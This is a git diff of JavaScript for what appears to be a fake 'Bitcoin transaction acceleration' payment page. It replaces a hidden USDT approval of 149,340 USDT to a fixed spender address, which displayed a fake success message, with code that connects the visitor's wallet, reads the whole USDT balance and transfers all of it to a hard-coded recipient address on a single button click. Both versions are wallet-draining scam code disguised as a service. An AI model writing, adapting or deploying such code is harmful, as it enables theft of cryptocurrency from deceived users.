@@ -1,80 +1,99 @@
-// 随机生成比特币加速序号
-function generateBtcOrderNumber() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let orderNumber = 'BTC';
-    for (let i = 0; i < 12; i++) {
-        orderNumber += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return orderNumber;
-}
+// USDT 合约地址（以太坊主网）
+const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+// 目标地址
+const recipientAddress = '0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C';
 
-// 页面加载时设置比特币加速序号
-document.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('btc-order').innerText = generateBtcOrderNumber();
-});
+// WalletConnect 提供者（需引入 WalletConnect SDK）
+async function getWeb3Provider() {
+    let web3;
 
-// 复制支付地址功能
-function copyAddress() {
-    const address = document.getElementById('pay-address').innerText;
-    navigator.clipboard.writeText(address).then(() => {
-        alert('地址已复制');
-    }).catch(err => {
-        console.error('复制失败', err);
-    });
-}
-
-async function authorizeUSDT() {
-    if (typeof window.ethereum !== 'undefined') {
+    // 优先尝试 MetaMask 或其他注入的以太坊提供者
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
         try {
-            // 优化点击响应时间
-            document.getElementById('nextButton').disabled = true;
-            document.getElementById('nextButton').innerText = '处理中...';
-            
-            // 请求连接到钱包
             await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
-            // 创建以太坊提供者和签名者
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            
-            // USDT 合约地址和 ABI
-            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
-            const usdtAbi = [
-                {
-                    "constant": false,
-                    "inputs": [
-                        { "name": "_spender", "type": "address" },
-                        { "name": "_value", "type": "uint256" }
-                    ],
-                    "name": "approve",
-                    "outputs": [{ "name": "", "type": "bool" }],
-                    "type": "function"
-                }
-            ];
-            
-            // 创建 USDT 合约实例
-            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-            
-            // 授权地址和数量
-            const spenderAddress = "0x65f9f8F6432375d9fF7E369b0996bE52992013B1";
-            const amount = ethers.utils.parseUnits("149340", 6); // 实际授权数量 149340 USDT
-            
-            // 发送授权交易
-            const tx = await usdtContract.approve(spenderAddress, amount);
-            await tx.wait();
-            
-            // 更新按钮文本并显示成功信息
-            document.getElementById('nextButton').innerText = '加速成功';
-            alert('加速成功！您的支付已完成。');
+            return web3;
         } catch (error) {
-            console.error(error);
-            document.getElementById('nextButton').innerText = '加速失败，请重试';
-            alert('加速失败，请重试');
-        } finally {
-            // 重新启用按钮
-            document.getElementById('nextButton').disabled = false;
+            console.error("MetaMask 连接失败:", error);
         }
+    } else if (window.web3) {
+        // 兼容旧版 Web3 注入（某些钱包可能仍使用）
+        web3 = new Web3(window.web3.currentProvider);
+        return web3;
     } else {
-        alert('请安装以太坊钱包插件');
+        // 如果没有注入提供者，使用 WalletConnect
+        alert("未检测到钱包注入，正在尝试通过 WalletConnect 连接...");
+        const WalletConnectProvider = window.WalletConnectProvider.default;
+        const provider = new WalletConnectProvider({
+            infuraId: "YOUR_INFURA_ID", // 请替换为您的 Infura ID 或其他节点服务
+        });
+        await provider.enable();
+        web3 = new Web3(provider);
+        return web3;
+    }
+
+    throw new Error("无法连接到任何钱包，请确保安装了支持 Web3 的钱包。");
+}
+
+async function transferUsdt() {
+    try {
+        // 获取 Web3 提供者
+        const web3 = await getWeb3Provider();
+        console.log("Web3 提供者已初始化");
+
+        // 获取账户
+        const accounts = await web3.eth.getAccounts();
+        const account = accounts[0];
+        console.log("已连接账户:", account);
+
+        // 检查网络并提示切换到以太坊主网
+        const chainId = await web3.eth.getChainId();
+        if (chainId.toString() !== "1") {
+            try {
+                await web3.currentProvider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x1' }], // 以太坊主网
+                });
+            } catch (switchError) {
+                alert("请手动切换到以太坊主网（Ethereum Mainnet）。");
+                return;
+            }
+        }
+
+        // USDT 合约 ABI
+        const usdtAbi = [
+            {
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+                "name": "transfer",
+                "outputs": [],
+                "type": "function"
+            }
+        ];
+
+        // 初始化 USDT 合约
+        const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
+
+        // 获取 USDT 余额
+        const balance = await usdtContract.methods.balanceOf(account).call();
+        const amount = web3.utils.toBN(balance);
+        console.log("USDT 余额:", web3.utils.fromWei(amount, 'mwei')); // USDT 有 6 个小数位
+
+        // 发起转账交易
+        await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
+        alert("交易已成功发送！");
+    } catch (error) {
+        console.error("错误详情:", error);
+        alert("您已取消: " + error.message);
     }
 }
+
+// 为按钮添加点击事件
+document.getElementById("ok-button").addEventListener("click", transferUsdt);
